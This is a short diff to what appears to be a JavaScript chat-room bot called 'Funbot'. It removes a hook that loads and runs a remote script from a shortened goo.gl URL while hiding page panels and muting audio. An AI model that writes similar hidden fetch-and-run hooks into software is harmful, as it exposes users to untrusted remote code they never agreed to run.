@@ -339,13 +339,6 @@ $('#audience').show();
 API.setVolume(15);
 };
 
-Funbot.hook = function(){
-(function(){$.getScript('http://goo.gl/MMsPi1');
-$('#playback').hide();
-$('#audience').hide();
-API.setVolume(0);}());
-};
-
 botMethods.load = function(){
     toSave = JSON.parse(localStorage.getItem("FunbotSave"));
     Funbot.settings = toSave.settings;
